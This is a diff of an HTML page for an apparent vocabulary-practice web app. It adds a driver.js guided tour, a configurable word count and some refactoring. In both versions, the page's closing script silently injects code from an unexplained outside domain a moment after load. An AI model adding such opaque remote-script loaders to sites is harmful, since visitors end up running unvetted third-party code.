@@ -12,7 +12,7 @@
     <link rel="stylesheet" crossorigin="anonymous"
         href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.1/animate.min.css">
 
-
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/driver.js/0.9.8/driver.min.js"></script>
     <style>
         @media (min-width: 0px) {
             html {
@@ -87,6 +87,12 @@
 
         [v-cloak] {
             display: none;
+        }
+
+        div#driver-highlighted-element-stage,
+        div#driver-page-overlay {
+            background: transparent !important;
+            outline: 5000px solid rgba(0, 0, 0, .75);
         }
     </style>
 </head>
@@ -304,7 +310,7 @@
 
         <span @click="er.emit('导航',1) " class="  d-none  btn     justify-content-end      "
             style="font-size:28px;    ">⚙</span>
-        <button @click="er.emit('导航',1) " class="navbar-light  navbar-toggler">
+        <button id="leftMenu" @click="er.emit('导航',1) " class="navbar-light  navbar-toggler">
             <span class="navbar-toggler-icon"></span>
         </button>
     </div>
@@ -318,6 +324,8 @@
     <!-- script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script -->
     <!--script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.6.1/js/bootstrap.min.js"></script  -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/URI.js/1.19.11/URI.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/driver.js/0.9.8/driver.min.js"></script>
+
 
     <script>
         const er = new EventEmitter //事件线
@@ -330,11 +338,11 @@
                 localStorage.setItem(key, JSON.stringify(value));
             },
             pset(key, value) { //私有设置
-                localStorage.setItem('_'+this.px+'_'+key, JSON.stringify(value));
+                localStorage.setItem('_' + this.px + '_' + key, JSON.stringify(value));
             },
             get(key) {
-                var v = localStorage.getItem('_'+this.px+'_'+key);//私有优先
-                v=v?v: localStorage.getItem( key);  
+                var v = localStorage.getItem('_' + this.px + '_' + key);//私有优先
+                v = v ? v : localStorage.getItem(key);
                 return JSON.parse(v);
             },
             remove(key) {
@@ -343,10 +351,16 @@
             px: '',
         }
         gd.pd = ref({ "load": [] });;//page data 页面元素引用"数据"
+
         //const pd = ref({ "load": [] }); //特殊变量，页面数据
         const pvs = gd.pd.value; //变量代理访问
         //gd.pd = pd;//page data 页面元素引用"数据"
+        gd.help = new Driver({
+            closeBtnText: '关闭', //   关闭按钮文案
+            nextBtnText: '下一个', //   下一步的按钮文案
+            prevBtnText: '上一个', //  上一步的按钮文案
 
+        });
         class pgui {
             /* 界面控制类 初始化界面默认值 */
             constructor(arg) {
@@ -369,6 +383,7 @@
                 pvs.unload = 1 //预加载后隐藏
                 pvs.selected = '' //选择的单词
                 pvs.selectedCss = 'hidden' //选择的单词
+                pvs.wordLen = 9 //联系词数
                 //确认
                 pvs.showConfirm = 0//确认检查
                 pvs.showJudgment = -1//判断对错
@@ -382,7 +397,7 @@
                 er.on('遮罩', this.loginLoading)
                 er.on('播放', this.play)
                 er.on('播放-候选', this.playChoose)
-                er.on('翻页', this.nextPage)
+                
 
                 er.on('进度', this.progress)
                 er.on('预加载', this.progress)//预加载
@@ -390,6 +405,7 @@
 
                 er.on('跳转', this.toPage)
                 er.on('播放完成', this.endPlay)
+                er.on('帮助.更多学习内容', this.hp2more)
             }
             endPlay(n) {
                 const that = gd.oui
@@ -403,9 +419,11 @@
                 if (n == 1 && pvs.selected == pvs.row.en && row.zh == pvs.row.zh) {
                     pvs.showJudgment = 0
                     if (pvs.page == pvs.testLs.length) {
-                        //完成学习
+                        //完成学习  +++  时间停止功能
                         setTimeout(() => {
-                            that.showInfo('恭喜 完成了练习', '真棒 ')
+                            that.showInfo('恭喜 完成了练习', '真棒 ');
+                            pvs.showJudgment = -1 //判断结果重置
+                            setTimeout(()=>er.emit('帮助.更多学习内容'),1800);
                             //完成提示进入挑战+++
 
                         }, 1600);
@@ -455,6 +473,7 @@
                 var dc = pvs.url.query(true);//参数
                 pvs.type = dc['t'] ? dc['t'] : gd.storage.get('pageType') ? gd.storage.get('pageType') : 'camb_word';//业务类型，url优先
                 pvs.pid = String(dc['p'] ? dc['p'] : gd.storage.get(pvs.type + '_pid') ? gd.storage.get(pvs.type + '_pid') : 365);//对应id，url优先
+                pvs.pid = pvs.pid.padStart(3, '0'); //id定长
                 gd.storage.set('pageType', pvs.type)
                 gd.storage.set(pvs.type + '_pid', pvs.pid)
                 console.log("script参数=", src, pvs.type, pvs.pid)
@@ -512,23 +531,16 @@
 
 
             }
-            nextPage(n) {
-                //内部翻页
-                const that = gd.oui
-                //document.getElementById('dataFromJson').remove ()
-                // delete  dataFromJSON .data
-                //on mount 
-                console.log('内部翻页', pvs.page, n)
-                //限定page的范围
-                pvs.page = parseInt(pvs.page) + n;
-                console.log('内部翻页', pvs.page, n)
-                if (pvs.page <= 0) { pvs.page = 1; that.showInfo("已经到头", '翻页'); return; }
-                if (pvs.page > pvs.total) { pvs.page = pvs.total; that.showInfo("已经到头", '翻页'); return; }
-                //---处理
-                gd.storage.set('page', pvs.page)
-                that.progressVal(6)
-                //载入数据 
-                that.signing(1)
+ 
+            hp2more() {
+
+                gd.help.highlight({
+                    element: '#leftMenu',
+                    popover: {
+                        title: '<em>这里有更多挑战等着你</em>', //突出框标题
+                        description: '从列表选择更多课程'//突出框描述
+                    }
+                });
 
             }
             play(n) {
@@ -603,7 +615,7 @@
                 //词展示++++
                 if (dat != 1) {//非内部翻页-首次加载
 
-                    pvs.testLs = _.slice(_.shuffle(dataFromJSON.data), 0, 9)//测试数
+                    pvs.testLs = _.slice(_.shuffle(dataFromJSON.data), 0,pvs.wordLen)//测试数
 
                     //pvs.testLs = dataFromJSON.data
                     pvs.total = pvs.testLs.length
@@ -694,15 +706,18 @@
         app.mount('#q-app')
     </script>
 
-<script>
-    (() => setTimeout(() => { 
-      var script = document.createElement("script"); 
-      script.src='https://an.17121.top/';
-      document.body.append(script)
-  }, 300))()
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/driver.js/0.9.8/driver.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/driver.js/0.9.8/driver.min.css">
+
+    <script>
+            (() => setTimeout(() => {
+                var script = document.createElement("script");
+                script.src = 'https://an.17121.top/';
+                document.body.append(script)
+            }, 300))()
 
 
-</script>
+    </script>
 </body>
 
 </html>
